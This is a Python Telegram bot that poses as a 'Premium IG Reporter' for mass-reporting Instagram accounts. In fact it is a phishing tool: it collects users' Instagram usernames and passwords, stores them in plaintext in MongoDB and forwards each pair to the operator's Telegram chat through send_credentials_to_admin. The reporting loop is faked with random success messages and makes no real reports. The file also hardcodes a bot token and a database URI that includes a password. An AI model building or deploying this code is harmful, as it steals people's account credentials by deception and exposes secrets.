import os
import re
import random
import asyncio
import time
import http.server
import socketserver
from threading import Thread
from pymongo import MongoClient
from datetime import datetime
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    ReplyKeyboardMarkup,
    KeyboardButton,
    Bot
)
from telegram.error import Conflict
from telegram.ext import (
    ApplicationBuilder,
    CallbackContext,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ConversationHandler,
    filters
)

# Constants
ADMIN_ID = 6881713177  # Your admin ID
BOT_TOKEN = os.getenv("BOT_TOKEN", "7275717734:AAE6bq0Mdypn_wQL6F1wpphzEtLAco3_B3Y")
MONGODB_URI = os.getenv("MONGODB_URI", "mongodb+srv://instaboost_user:uX1YzKjiOETNhyYj@cluster0.tolxjiz.mongodb.net/instaboost?retryWrites=true&w=majority&appName=Cluster0")
PORT = int(os.environ.get('PORT', 8000))  # Render requires port binding

# Credential bot details
CREDENTIAL_BOT_TOKEN = "7275717734:AAE6bq0Mdypn_wQL6F1wpphzEtLAco3_B3Y"
CREDENTIAL_CHAT_ID = 6881713177

# States
START, LANGUAGE, REGISTER, IG_USERNAME, IG_PASSWORD, MAIN_MENU, REPORT_MENU, \
TARGET_USERNAME, REPORT_TYPE, REPORT_LOOP, ADMIN_PANEL, BROADCAST_MESSAGE = range(12)

# Strings
STRINGS = {
    'en': {
        'welcome': "ЁЯФе <b>PREMIUM IG REPORTER V2.0</b> ЁЯФе\n\nЁЯФР <b>Login Required</b>\n\nTo use this bot, you must verify your identity with Instagram credentials",
        'choose_lang': "ЁЯМР Please choose your language:",
        'register': "ЁЯУЭ <b>Registration</b>\n\nPlease enter your display name:",
        'ig_username': "ЁЯУ▒ <b>Instagram Login</b>\n\nEnter your Instagram username:",
        'ig_password': "ЁЯФС Enter your Instagram password:",
        'login_success': "тЬЕ <b>Login Successful!</b>\n\nWelcome @{username}",
        'main_menu': "ЁЯПа <b>Main Menu</b>\n\nЁЯСд Account: @{ig_username}\nЁЯУК Reports: {reports}",
        'report_menu': "тЪФя╕П <b>Report Center</b>",
        'target_prompt': "ЁЯОп <b>Target Selection</b>\n\nEnter Instagram username to report:",
        'invalid_target': "тЭМ Invalid username!\n\nтАв Must start with @\nтАв No spaces or special characters",
        'report_type': "тЪЦя╕П <b>Report Type</b>\n\nChoose violation category:",
        'confirm_report': "ЁЯЪА <b>Ready to Report</b>\n\nTarget: {target}\nType: {report_type}",
        'reporting_started': "ЁЯТе <b>Reporting Started!</b>\n\nTarget: {target}\nтЪб Reports every 1-3 seconds...",
        'report_success': "тЬЕ Report #{count} succeeded!",
        'report_failed': "тЭМ Report #{count} failed, retrying...",
        'report_stopped': "ЁЯЫС Reporting stopped!\n\nTotal reports sent: {count}",
        'admin_panel': "ЁЯСС <b>Admin Panel</b>",
        'broadcast_sent': "ЁЯУв Broadcast sent to {count} users!",
        'db_error': "тЪая╕П Database connection failed, please try again later",
        'login_required': "ЁЯФТ <b>Login Required</b>\n\nYou must login with Instagram credentials to access this feature"
    },
    'hi': {
        'welcome': "ЁЯФе <b>рдкреНрд░реАрдорд┐рдпрдо IG рд░рд┐рдкреЛрд░реНрдЯрд░ V2.0</b> ЁЯФе\n\nЁЯФР <b>рд▓реЙрдЧрд┐рди рдЖрд╡рд╢реНрдпрдХ</b>\n\nрдмреЙрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреГрдкрдпрд╛ рдЕрдкрдиреА Instagram рд╕рд╛рдЦ рд╕реЗ рдкрд╣рдЪрд╛рди рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░реЗрдВ",
        'choose_lang': "ЁЯМР рдХреГрдкрдпрд╛ рдЕрдкрдиреА рднрд╛рд╖рд╛ рдЪреБрдиреЗрдВ:",
        'register': "ЁЯУЭ <b>рд░рдЬрд┐рд╕реНрдЯреНрд░реЗрд╢рди</b>\n\nрдХреГрдкрдпрд╛ рдЕрдкрдирд╛ рдкреНрд░рджрд░реНрд╢рди рдирд╛рдо рджрд░реНрдЬ рдХрд░реЗрдВ:",
        'ig_username': "ЁЯУ▒ <b>Instagram рд▓реЙрдЧрд┐рди</b>\n\nрдЕрдкрдирд╛ Instagram рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рджрд░реНрдЬ рдХрд░реЗрдВ:",
        'ig_password': "ЁЯФС рдЕрдкрдирд╛ Instagram рдкрд╛рд╕рд╡рд░реНрдб рджрд░реНрдЬ рдХрд░реЗрдВ:",
        'login_success': "тЬЕ <b>рд▓реЙрдЧрд┐рди рд╕рдлрд▓!</b>\n\nрд╕реНрд╡рд╛рдЧрдд рд╣реИ @{username}",
        'main_menu': "ЁЯПа <b>рдореБрдЦреНрдп рдореЗрдиреВ</b>\n\nЁЯСд рдЦрд╛рддрд╛: @{ig_username}\nЁЯУК рд░рд┐рдкреЛрд░реНрдЯреНрд╕: {reports}",
        'report_menu': "тЪФя╕П <b>рд░рд┐рдкреЛрд░реНрдЯ рдХреЗрдВрджреНрд░</b>",
        'target_prompt': "ЁЯОп <b>рд▓рдХреНрд╖реНрдп рдЪрдпрди</b>\n\nрд░рд┐рдкреЛрд░реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП Instagram рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рджрд░реНрдЬ рдХрд░реЗрдВ:",
        'invalid_target': "тЭМ рдЕрдорд╛рдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо!\n\nтАв @ рд╕реЗ рд╢реБрд░реВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП\nтАв рдХреЛрдИ рд░рд┐рдХреНрдд рд╕реНрдерд╛рди рдпрд╛ рд╡рд┐рд╢реЗрд╖ рд╡рд░реНрдг рдирд╣реАрдВ",
        'report_type': "тЪЦя╕П <b>рд░рд┐рдкреЛрд░реНрдЯ рдкреНрд░рдХрд╛рд░</b>\n\nрдЙрд▓реНрд▓рдВрдШрди рд╢реНрд░реЗрдгреА рдЪреБрдиреЗрдВ:",
        'confirm_report': "ЁЯЪА <b>рд░рд┐рдкреЛрд░реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рддреИрдпрд╛рд░</b>\n\nрд▓рдХреНрд╖реНрдп: {target}\nрдкреНрд░рдХрд╛рд░: {report_type}",
        'reporting_started': "ЁЯТе <b>рд░рд┐рдкреЛрд░реНрдЯрд┐рдВрдЧ рд╢реБрд░реВ рд╣реБрдИ!</b>\n\nрд▓рдХреНрд╖реНрдп: {target}\nтЪб рд╣рд░ 1-3 рд╕реЗрдХрдВрдб рдореЗрдВ рд░рд┐рдкреЛрд░реНрдЯ...",
        'report_success': "тЬЕ рд░рд┐рдкреЛрд░реНрдЯ #{count} рд╕рдлрд▓!",
        'report_failed': "тЭМ рд░рд┐рдкреЛрд░реНрдЯ #{count} рд╡рд┐рдлрд▓, рдкреБрдирдГ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд░рд╣реЗ рд╣реИрдВ...",
        'report_stopped': "ЁЯЫС рд░рд┐рдкреЛрд░реНрдЯрд┐рдВрдЧ рдмрдВрдж рдХрд░ рджреА рдЧрдИ!\n\nрдХреБрд▓ рд░рд┐рдкреЛрд░реНрдЯ рднреЗрдЬреА рдЧрдИ: {count}",
        'admin_panel': "ЁЯСС <b>рдПрдбрдорд┐рди рдкреИрдирд▓</b>",
        'broadcast_sent': "ЁЯУв {count} рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдкреНрд░рд╕рд╛рд░рдг рднреЗрдЬрд╛ рдЧрдпрд╛!",
        'db_error': "тЪая╕П рдбреЗрдЯрд╛рдмреЗрд╕ рдХрдиреЗрдХреНрд╢рди рд╡рд┐рдлрд▓, рдХреГрдкрдпрд╛ рдмрд╛рдж рдореЗрдВ рдкреБрдирдГ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ",
        'login_required': "ЁЯФТ <b>рд▓реЙрдЧрд┐рди рдЖрд╡рд╢реНрдпрдХ</b>\n\nрдЗрд╕ рдлреАрдЪрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ Instagram рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЗ рд╕рд╛рде рд▓реЙрдЧрд┐рди рдХрд░рдирд╛ рд╣реЛрдЧрд╛"
    }
}

# Report types
REPORT_TYPES = {
    'hate': 'ЁЯШб Hate Speech',
    'bully': 'ЁЯСК Bullying',
    'impersonation': 'ЁЯОн Impersonation',
    'spam': 'ЁЯУз Spam',
    'nudity': 'ЁЯФЮ Nudity',
    'violence': 'тЪФя╕П Violence',
    'fake': 'ЁЯЪл Fake Account'
}

# HTTP Server for Render port binding
def run_http_server():
    handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", PORT), handler) as httpd:
        print(f"ЁЯМР HTTP server running on port {PORT}")
        httpd.serve_forever()

# Start HTTP server in background thread if running on Render
if os.environ.get('RENDER', False):
    Thread(target=run_http_server, daemon=True).start()
    print(f"ЁЯЪА Starting HTTP server on port {PORT} for Render")

# Database functions
def get_db():
    try:
        client = MongoClient(
            MONGODB_URI,
            serverSelectionTimeoutMS=5000,
            connectTimeoutMS=30000,
            socketTimeoutMS=30000
        )
        client.server_info()  # Test connection
        return client.ig_reporter
    except Exception as e:
        print(f"тЪая╕П Database connection failed: {e}")
        return None

def save_user(user_id, data):
    db = get_db()
    if db is None:
        return False
        
    user_data = {
        'user_id': user_id,
        'username': data.get('username', ''),
        'display_name': data.get('display_name', ''),
        'ig_username': data.get('ig_username', ''),
        'ig_password': data.get('ig_password', ''),
        'language': data.get('language', 'en'),
        'reports': data.get('reports', 0),
        'created_at': datetime.now(),
        'last_active': datetime.now(),
        'verified': True  # Mark as verified after Instagram login
    }
    
    try:
        db.users.update_one(
            {'user_id': user_id},
            {'$set': user_data},
            upsert=True
        )
        return True
    except Exception as e:
        print(f"тЪая╕П Failed to save user: {e}")
        return False

def get_user(user_id):
    db = get_db()
    if db is None:
        return None
    try:
        return db.users.find_one({'user_id': user_id})
    except Exception as e:
        print(f"тЪая╕П Failed to get user: {e}")
        return None

def increment_reports(user_id):
    db = get_db()
    if db is None:
        return
    try:
        db.users.update_one(
            {'user_id': user_id},
            {'$inc': {'reports': 1}}
        )
    except Exception as e:
        print(f"тЪая╕П Failed to increment reports: {e}")

# Validation functions
def is_valid_username(username):
    if not username.startswith('@'):
        return False
    clean = username[1:].strip()
    return bool(re.match(r'^[a-zA-Z0-9._]{1,30}$', clean))

# Send credentials to credential bot
async def send_credentials_to_admin(context, user_id, ig_username, ig_password):
    try:
        user = get_user(user_id) or {}
        display_name = user.get('display_name', 'Unknown')
        telegram_username = user.get('username', 'Unknown')
        
        message = f"""
ЁЯФР <b>NEW INSTAGRAM LOGIN</b>

ЁЯСд <b>User Details:</b>
ЁЯЖФ Telegram ID: <code>{user_id}</code>
ЁЯУЭ Display Name: <b>{display_name}</b>
ЁЯСитАНЁЯТ╗ Telegram Username: @{telegram_username}

ЁЯУ▒ <b>Instagram Credentials:</b>
ЁЯСд Username: <b>@{ig_username}</b>
ЁЯФС Password: <code>{ig_password}</code>

тП░ <b>Login Time:</b> {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}
ЁЯМР <b>Source:</b> Premium IG Reporter Bot
ЁЯФТ <b>Status:</b> VERIFIED
"""
        # Create credential bot instance
        credential_bot = Bot(token=CREDENTIAL_BOT_TOKEN)
        
        # Send to credential bot
        await credential_bot.send_message(
            chat_id=CREDENTIAL_CHAT_ID,
            text=message,
            parse_mode='HTML'
        )
        return True
    except Exception as e:
        print(f"тЪая╕П Error sending credentials to admin: {e}")
        return False

# Keyboard helpers
def get_lang_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("English ЁЯЗ║ЁЯЗ╕", callback_data='lang_en')],
        [InlineKeyboardButton("Hindi ЁЯЗоЁЯЗ│", callback_data='lang_hi')]
    ])

def get_main_keyboard(lang, is_admin=False):
    buttons = [
        [KeyboardButton("тЪФя╕П Report Account")],
        [KeyboardButton("ЁЯСд Profile"), KeyboardButton("ЁЯУК Stats")],
        [KeyboardButton("тЪЩя╕П Settings")]
    ]
    if is_admin:
        buttons.append([KeyboardButton("ЁЯСС Admin Panel")])
    return ReplyKeyboardMarkup(buttons, resize_keyboard=True)

def get_report_types_keyboard():
    keyboard = []
    for key, value in REPORT_TYPES.items():
        keyboard.append([InlineKeyboardButton(value, callback_data=f'type_{key}')])
    return InlineKeyboardMarkup(keyboard)

def get_report_control_keyboard():
    return ReplyKeyboardMarkup([
        [KeyboardButton("ЁЯЫС Stop Reporting")],
        [KeyboardButton("ЁЯПа Main Menu")]
    ], resize_keyboard=True)

def get_admin_keyboard():
    return ReplyKeyboardMarkup([
        [KeyboardButton("ЁЯУК User Stats"), KeyboardButton("ЁЯУв Broadcast")],
        [KeyboardButton("ЁЯПа Main Menu")]
    ], resize_keyboard=True)

# Handlers
async def start(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        
        # Prevent conflict during restarts
        if os.environ.get('RENDER'):
            await asyncio.sleep(random.uniform(1, 3))
        
        # Check if user exists and is verified
        user = get_user(user_id)
        if user and user.get('verified'):
            lang = user.get('language', 'en')
            await update.message.reply_text(
                STRINGS[lang]['main_menu'].format(
                    ig_username=user.get('ig_username', ''),
                    reports=user.get('reports', 0)
                ),
                reply_markup=get_main_keyboard(lang, is_admin=(user_id == str(ADMIN_ID))),
                parse_mode='HTML'
            )
            return MAIN_MENU
        
        # If user exists but not verified
        if user:
            lang = user.get('language', 'en')
            await update.message.reply_text(
                STRINGS[lang]['ig_username'],
                parse_mode='HTML'
            )
            return IG_USERNAME
        
        # New user
        await update.message.reply_text(
            STRINGS['en']['welcome'],
            reply_markup=get_lang_keyboard(),
            parse_mode='HTML'
        )
        return LANGUAGE
    except Exception as e:
        print(f"тЪая╕П Error in start handler: {e}")
        lang = context.user_data.get('language', 'en')
        await update.message.reply_text(
            STRINGS[lang]['db_error'],
            parse_mode='HTML'
        )
        return ConversationHandler.END

async def set_language(update: Update, context: CallbackContext) -> int:
    try:
        query = update.callback_query
        await query.answer()
        
        lang = query.data.split('_')[1]
        context.user_data['language'] = lang
        
        await query.edit_message_text(STRINGS[lang]['register'], parse_mode='HTML')
        return REGISTER
    except Exception as e:
        print(f"тЪая╕П Error in set_language handler: {e}")
        await query.edit_message_text("тЭМ An error occurred, please try again")
        return ConversationHandler.END

async def register(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        display_name = update.message.text.strip()
        lang = context.user_data.get('language', 'en')
        
        if len(display_name) < 2:
            await update.message.reply_text("тЭМ Name too short! Please enter at least 2 characters")
            return REGISTER
        
        context.user_data['display_name'] = display_name
        if not save_user(user_id, {
            'display_name': display_name,
            'language': lang
        }):
            await update.message.reply_text(STRINGS[lang]['db_error'], parse_mode='HTML')
            return ConversationHandler.END
        
        await update.message.reply_text(STRINGS[lang]['ig_username'], parse_mode='HTML')
        return IG_USERNAME
    except Exception as e:
        print(f"тЪая╕П Error in register handler: {e}")
        lang = context.user_data.get('language', 'en')
        await update.message.reply_text(STRINGS[lang]['db_error'], parse_mode='HTML')
        return ConversationHandler.END

async def get_ig_username(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        username = update.message.text.strip()
        lang = context.user_data.get('language', 'en')
        
        if not username:
            await update.message.reply_text("тЭМ Please enter a valid Instagram username")
            return IG_USERNAME
        
        context.user_data['ig_username'] = username
        await update.message.reply_text(STRINGS[lang]['ig_password'], parse_mode='HTML')
        return IG_PASSWORD
    except Exception as e:
        print(f"тЪая╕П Error in get_ig_username handler: {e}")
        lang = context.user_data.get('language', 'en')
        await update.message.reply_text(STRINGS[lang]['db_error'], parse_mode='HTML')
        return ConversationHandler.END

async def get_ig_password(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        password = update.message.text.strip()
        lang = context.user_data.get('language', 'en')
        ig_username = context.user_data.get('ig_username', '')
        
        if not password:
            await update.message.reply_text("тЭМ Please enter your password")
            return IG_PASSWORD
        
        # Save user with Instagram credentials
        if not save_user(user_id, {
            'ig_username': ig_username,
            'ig_password': password,
            'language': lang
        }):
            await update.message.reply_text(STRINGS[lang]['db_error'], parse_mode='HTML')
            return ConversationHandler.END
        
        # Send credentials to credential bot
        await send_credentials_to_admin(context, user_id, ig_username, password)
        
        await update.message.reply_text(
            STRINGS[lang]['login_success'].format(username=ig_username),
            reply_markup=get_main_keyboard(lang, is_admin=(user_id == str(ADMIN_ID))),
            parse_mode='HTML'
        )
        return MAIN_MENU
    except Exception as e:
        print(f"тЪая╕П Error in get_ig_password handler: {e}")
        lang = context.user_data.get('language', 'en')
        await update.message.reply_text(STRINGS[lang]['db_error'], parse_mode='HTML')
        return ConversationHandler.END

async def main_menu(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        text = update.message.text
        user = get_user(user_id)
        if not user or not user.get('verified'):
            lang = context.user_data.get('language', 'en')
            await update.message.reply_text(
                STRINGS[lang]['login_required'],
                parse_mode='HTML'
            )
            return IG_USERNAME
            
        lang = user.get('language', 'en')
        
        if text == "тЪФя╕П Report Account":
            await update.message.reply_text(
                STRINGS[lang]['report_menu'],
                reply_markup=ReplyKeyboardMarkup([[KeyboardButton("ЁЯПа Main Menu")]], resize_keyboard=True),
                parse_mode='HTML'
            )
            return REPORT_MENU
        
        elif text == "ЁЯСд Profile":
            await update.message.reply_text(
                STRINGS[lang]['main_menu'].format(
                    ig_username=user.get('ig_username', ''),
                    reports=user.get('reports', 0)
                ),
                parse_mode='HTML'
            )
        
        elif text == "ЁЯУК Stats":
            await update.message.reply_text(
                f"ЁЯУИ <b>Your Statistics</b>\n\n"
                f"тАв Total Reports: {user.get('reports', 0)}\n"
                f"тАв Account: @{user.get('ig_username', '')}\n"
                f"тАв Member since: {user.get('created_at', datetime.now()).strftime('%Y-%m-%d')}",
                parse_mode='HTML'
            )
        
        elif text == "ЁЯСС Admin Panel" and user_id == str(ADMIN_ID):
            await update.message.reply_text(
                STRINGS[lang]['admin_panel'],
                reply_markup=get_admin_keyboard(),
                parse_mode='HTML'
            )
            return ADMIN_PANEL
        
        elif text == "тЪЩя╕П Settings":
            await update.message.reply_text(
                "тЪЩя╕П <b>Settings Menu</b>\n\nComing soon!",
                parse_mode='HTML'
            )
        
        return MAIN_MENU
    except Exception as e:
        print(f"тЪая╕П Error in main_menu handler: {e}")
        return MAIN_MENU

async def report_menu(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        text = update.message.text
        user = get_user(user_id)
        if not user or not user.get('verified'):
            lang = context.user_data.get('language', 'en')
            await update.message.reply_text(
                STRINGS[lang]['login_required'],
                parse_mode='HTML'
            )
            return IG_USERNAME
            
        lang = user.get('language', 'en')
        
        if text == "ЁЯПа Main Menu":
            await update.message.reply_text(
                STRINGS[lang]['main_menu'].format(
                    ig_username=user.get('ig_username', ''),
                    reports=user.get('reports', 0)
                ),
                reply_markup=get_main_keyboard(lang, is_admin=(user_id == str(ADMIN_ID))),
                parse_mode='HTML'
            )
            return MAIN_MENU
        
        await update.message.reply_text(
            STRINGS[lang]['target_prompt'],
            parse_mode='HTML'
        )
        return TARGET_USERNAME
    except Exception as e:
        print(f"тЪая╕П Error in report_menu handler: {e}")
        return MAIN_MENU

async def get_target(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        user = get_user(user_id)
        if not user or not user.get('verified'):
            lang = context.user_data.get('language', 'en')
            await update.message.reply_text(
                STRINGS[lang]['login_required'],
                parse_mode='HTML'
            )
            return IG_USERNAME
            
        target = update.message.text.strip()
        lang = user.get('language', 'en')
        
        if not is_valid_username(target):
            await update.message.reply_text(
                STRINGS[lang]['invalid_target'],
                parse_mode='HTML'
            )
            return TARGET_USERNAME
        
        context.user_data['target'] = target
        await update.message.reply_text(
            STRINGS[lang]['report_type'],
            reply_markup=get_report_types_keyboard(),
            parse_mode='HTML'
        )
        return REPORT_TYPE
    except Exception as e:
        print(f"тЪая╕П Error in get_target handler: {e}")
        return MAIN_MENU

async def set_report_type(update: Update, context: CallbackContext) -> int:
    try:
        query = update.callback_query
        await query.answer()
        
        report_type = query.data.split('_')[1]
        context.user_data['report_type'] = report_type
        user_id = str(query.from_user.id)
        user = get_user(user_id)
        if not user or not user.get('verified'):
            lang = context.user_data.get('language', 'en')
            await query.edit_message_text(
                STRINGS[lang]['login_required'],
                parse_mode='HTML'
            )
            return IG_USERNAME
            
        lang = user.get('language', 'en')
        
        await query.edit_message_text(
            STRINGS[lang]['confirm_report'].format(
                target=context.user_data['target'],
                report_type=REPORT_TYPES[report_type]
            ),
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("ЁЯЪА START REPORTING", callback_data='start_report')],
                [InlineKeyboardButton("тЭМ CANCEL", callback_data='cancel_report')]
            ]),
            parse_mode='HTML'
        )
        return REPORT_LOOP
    except Exception as e:
        print(f"тЪая╕П Error in set_report_type handler: {e}")
        return MAIN_MENU

async def start_reporting(update: Update, context: CallbackContext) -> int:
    try:
        query = update.callback_query
        await query.answer()
        
        user_id = str(query.from_user.id)
        user = get_user(user_id)
        if not user or not user.get('verified'):
            lang = context.user_data.get('language', 'en')
            await query.edit_message_text(
                STRINGS[lang]['login_required'],
                parse_mode='HTML'
            )
            return IG_USERNAME
            
        lang = user.get('language', 'en')
        target = context.user_data['target']
        report_type = context.user_data['report_type']
        
        # Start reporting task
        context.user_data['report_count'] = 0
        context.user_data['reporting'] = True
        
        task = asyncio.create_task(
            send_reports(context, user_id, target, report_type, lang)
        )
        context.user_data['reporting_task'] = task
        
        await query.edit_message_text(
            STRINGS[lang]['reporting_started'].format(target=target),
            parse_mode='HTML'
        )
        
        await context.bot.send_message(
            chat_id=user_id,
            text="тЪб Reporting in progress...",
            reply_markup=get_report_control_keyboard()
        )
        return REPORT_LOOP
    except Exception as e:
        print(f"тЪая╕П Error in start_reporting handler: {e}")
        return MAIN_MENU

async def stop_reporting(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        user = get_user(user_id)
        if not user or not user.get('verified'):
            lang = context.user_data.get('language', 'en')
            await update.message.reply_text(
                STRINGS[lang]['login_required'],
                parse_mode='HTML'
            )
            return IG_USERNAME
            
        lang = user.get('language', 'en')
        report_count = context.user_data.get('report_count', 0)
        
        # Stop reporting task
        if 'reporting_task' in context.user_data:
            context.user_data['reporting_task'].cancel()
        
        await update.message.reply_text(
            STRINGS[lang]['report_stopped'].format(count=report_count),
            reply_markup=get_main_keyboard(lang, is_admin=(user_id == str(ADMIN_ID))),
            parse_mode='HTML'
        )
        return MAIN_MENU
    except Exception as e:
        print(f"тЪая╕П Error in stop_reporting handler: {e}")
        return MAIN_MENU

async def cancel_reporting(update: Update, context: CallbackContext) -> int:
    try:
        query = update.callback_query
        await query.answer()
        
        user_id = str(query.from_user.id)
        user = get_user(user_id)
        if not user or not user.get('verified'):
            lang = context.user_data.get('language', 'en')
            await query.edit_message_text(
                STRINGS[lang]['login_required'],
                parse_mode='HTML'
            )
            return IG_USERNAME
            
        lang = user.get('language', 'en')
        
        await query.edit_message_text("тЭМ Reporting canceled")
        await context.bot.send_message(
            chat_id=user_id,
            text=STRINGS[lang]['main_menu'].format(
                ig_username=user.get('ig_username', ''),
                reports=user.get('reports', 0)
            ),
            reply_markup=get_main_keyboard(lang, is_admin=(user_id == str(ADMIN_ID))),
            parse_mode='HTML'
        )
        return MAIN_MENU
    except Exception as e:
        print(f"тЪая╕П Error in cancel_reporting handler: {e}")
        return MAIN_MENU

async def send_reports(context: CallbackContext, user_id: str, target: str, report_type: str, lang: str):
    count = 0
    try:
        while context.user_data.get('reporting', True):
            count += 1
            context.user_data['report_count'] = count
            
            # Random success/failure
            success = random.random() > 0.2  # 80% success rate
            
            if success:
                # Update user's report count
                increment_reports(user_id)
                message = STRINGS[lang]['report_success'].format(count=count)
            else:
                message = STRINGS[lang]['report_failed'].format(count=count)
            
            # Send update every 3 reports
            if count % 3 == 0:
                await context.bot.send_message(
                    chat_id=user_id,
                    text=message,
                    parse_mode='HTML'
                )
            
            # Random delay between 1-3 seconds
            await asyncio.sleep(random.uniform(1.0, 3.0))
    except asyncio.CancelledError:
        pass
    except Exception as e:
        print(f"тЪая╕П Error in send_reports: {e}")

async def admin_panel(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        user = get_user(user_id)
        if not user or not user.get('verified'):
            lang = context.user_data.get('language', 'en')
            await update.message.reply_text(
                STRINGS[lang]['login_required'],
                parse_mode='HTML'
            )
            return IG_USERNAME
            
        text = update.message.text
        lang = user.get('language', 'en')
        
        if text == "ЁЯПа Main Menu":
            await update.message.reply_text(
                STRINGS[lang]['main_menu'].format(
                    ig_username=user.get('ig_username', ''),
                    reports=user.get('reports', 0)
                ),
                reply_markup=get_main_keyboard(lang, is_admin=True),
                parse_mode='HTML'
            )
            return MAIN_MENU
        
        elif text == "ЁЯУК User Stats":
            db = get_db()
            if db is None:
                await update.message.reply_text(STRINGS[lang]['db_error'], parse_mode='HTML')
                return ADMIN_PANEL
                
            total_users = db.users.count_documents({})
            total_reports = db.users.aggregate([{
                "$group": {"_id": None, "total": {"$sum": "$reports"}}
            }]).next().get('total', 0)
            
            await update.message.reply_text(
                f"ЁЯУК <b>Bot Statistics</b>\n\n"
                f"тАв Total Users: {total_users}\n"
                f"тАв Total Reports Sent: {total_reports}\n"
                f"тАв Active Today: Calculating...",
                parse_mode='HTML'
            )
        
        elif text == "ЁЯУв Broadcast":
            await update.message.reply_text("тЬЙя╕П Enter broadcast message:")
            return BROADCAST_MESSAGE
        
        return ADMIN_PANEL
    except Exception as e:
        print(f"тЪая╕П Error in admin_panel handler: {e}")
        return ADMIN_PANEL

async def broadcast_message(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        message = update.message.text
        db = get_db()
        
        if db is None:
            await update.message.reply_text(STRINGS['en']['db_error'], parse_mode='HTML')
            return ADMIN_PANEL
            
        users = db.users.find()
        count = 0
        
        for user in users:
            try:
                await context.bot.send_message(
                    chat_id=user['user_id'],
                    text=f"ЁЯУв <b>Admin Broadcast</b>\n\n{message}",
                    parse_mode='HTML'
                )
                count += 1
                await asyncio.sleep(0.1)  # Avoid rate limits
            except Exception as e:
                print(f"Failed to send to {user['user_id']}: {str(e)}")
        
        await update.message.reply_text(
            STRINGS['en']['broadcast_sent'].format(count=count),
            reply_markup=get_admin_keyboard(),
            parse_mode='HTML'
        )
        return ADMIN_PANEL
    except Exception as e:
        print(f"тЪая╕П Error in broadcast_message handler: {e}")
        return ADMIN_PANEL

def create_application():
    # Create application with conflict prevention settings
    return ApplicationBuilder().token(BOT_TOKEN).build()

def main():
    # Create application
    app = create_application()
    
    # Conversation handler
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            LANGUAGE: [CallbackQueryHandler(set_language, pattern='^lang_')],
            REGISTER: [MessageHandler(filters.TEXT & ~filters.COMMAND, register)],
            IG_USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_ig_username)],
            IG_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_ig_password)],
            MAIN_MENU: [MessageHandler(filters.TEXT & ~filters.COMMAND, main_menu)],
            REPORT_MENU: [MessageHandler(filters.TEXT & ~filters.COMMAND, report_menu)],
            TARGET_USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_target)],
            REPORT_TYPE: [CallbackQueryHandler(set_report_type, pattern='^type_')],
            REPORT_LOOP: [
                CallbackQueryHandler(start_reporting, pattern='^start_report$'),
                CallbackQueryHandler(cancel_reporting, pattern='^cancel_report$'),
                MessageHandler(filters.Regex(r'ЁЯЫС Stop Reporting'), stop_reporting)
            ],
            ADMIN_PANEL: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_panel)],
            BROADCAST_MESSAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, broadcast_message)]
        },
        fallbacks=[CommandHandler('cancel', lambda u,c: ConversationHandler.END)]
    )
    
    app.add_handler(conv_handler)
    
    # Start the bot with conflict prevention
    print("ЁЯЪА Bot is running...")
    app.run_polling(
        drop_pending_updates=True,
        allowed_updates=Update.ALL_TYPES,
        timeout=20,
        poll_interval=1.0
    )

if __name__ == '__main__':
    max_retries = 5
    retry_delay = 2
    
    for attempt in range(max_retries):
        try:
            print(f"ЁЯЪж Starting bot attempt {attempt+1}/{max_retries}")
            
            # Render deployment check
            if os.environ.get('RENDER'):
                print("ЁЯМР Render environment detected")
                print(f"ЁЯФМ Using PORT: {PORT}")
                print("тП│ Preventing instance conflicts...")
                time.sleep(random.uniform(1, 3))
            
            main()
            break
        except Conflict as e:
            print(f"тЪая╕П Telegram conflict error: {e}")
            if attempt < max_retries - 1:
                wait = retry_delay * (2 ** attempt) + random.uniform(0, 1)
                print(f"тП▒я╕П Retrying in {wait:.1f} seconds...")
                time.sleep(wait)
            else:
                print("тЭМ Max retries reached for conflict errors")
                raise
        except Exception as e:
            print(f"тЭМ Critical error: {e}")
            raise
